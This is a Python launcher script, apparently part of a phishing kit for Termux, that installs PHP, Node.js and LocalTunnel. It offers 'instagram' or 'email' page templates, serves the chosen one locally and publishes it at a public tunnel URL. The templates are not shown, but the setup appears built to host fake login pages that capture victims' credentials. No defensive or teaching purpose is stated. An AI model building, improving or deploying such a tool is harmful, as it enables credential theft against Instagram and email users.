import os
import sys
import time
import subprocess

# -------- Colors --------
red = '\033[1;31m'
grn = '\033[1;32m'
ylo = '\033[1;33m'
cyan = '\033[1;36m'
pink = '\033[1;35m'
reset = '\033[0m'

# -------- Banner --------
def banner():
    os.system("clear")
    print(f"""{cyan}
██████╗ ██████╗  ██████╗     {cyan}██████╗ 
██╔══██╗██╔══██╗██╔═══██╗    {cyan}██╔══██╗
██████╔╝██████╔╝██║   ██║    {cyan}██████╔╝
██╔═══╝ ██╔═══╝ ██║   ██║    {cyan}██╔═══╝ 
██║     ██║     ╚██████╔╝    {cyan}██║     
╚═╝     ╚═╝      ╚═════╝     {cyan}╚═╝     
{reset}""")
    print(f"{pink}══════════════════════════════════════{reset}")
    print(f"{ylo} PRO D  |  Made by Dhani")
    print(f"{pink}══════════════════════════════════════{reset}\n")

# -------- Check and install packages --------
def check_command(cmd, install_cmd=None):
    try:
        subprocess.run([cmd, "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        if install_cmd:
            print(f"{ylo}{cmd} not found. Installing...{reset}")
            os.system(install_cmd)
        else:
            print(f"{red}{cmd} is required but not found. Exiting.{reset}")
            sys.exit()

# Check PHP
check_command("php", install_cmd="pkg install php -y" if "termux" in sys.executable else None)

# Check Node.js
check_command("node", install_cmd="pkg install nodejs -y" if "termux" in sys.executable else None)

# Check LocalTunnel
try:
    subprocess.run(["lt", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except FileNotFoundError:
    print(f"{ylo}LocalTunnel not found. Installing via npm...{reset}")
    os.system("npm install -g localtunnel")

# -------- Choose template --------
banner()
print(f"""{pink}
╔══════════════════════════════╗
║ {cyan}Choose Page Template{pink}        
╠══════════════════════════════╣
║ [1] instagram                 
║ [2] email                
╚══════════════════════════════╝
{reset}""")
choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
selected_html = "1.html" if choice == "1" else "2.html"

# -------- PHP Server --------
php_port = 8080
php_command = ["php", "-S", f"127.0.0.1:{php_port}"]

print(f"{grn}Starting PHP server on http://127.0.0.1:{php_port} ...{reset}")
php_process = subprocess.Popen(php_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# -------- Wait a little for server to start --------
time.sleep(2)

# -------- LocalTunnel --------
print(f"{grn}Starting LocalTunnel to get public URL...{reset}")
lt_process = subprocess.Popen(
    ["lt", "--port", str(php_port)],
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

public_url = None
while True:
    line = lt_process.stdout.readline()
    if line:
        print(line.strip())  # show log
        if "your url is:" in line.lower():
            public_url = line.split()[-1]
            break
    else:
        time.sleep(0.1)

print(f"""{grn}
╔═══════════════════════════════════╗
║ {cyan}SERVER RUNNING...               {grn}
╠═══════════════════════════════════╣
║ {ylo}Local: http://127.0.0.1:{php_port}{grn}   
║ {ylo}Public: {public_url}{grn}        
╚═══════════════════════════════════╝
{reset}""")

# -------- Keep script running --------
try:
    php_process.wait()
    lt_process.wait()
except KeyboardInterrupt:
    print(f"{red}\nStopping server...{reset}")
    php_process.terminate()
    lt_process.terminate()
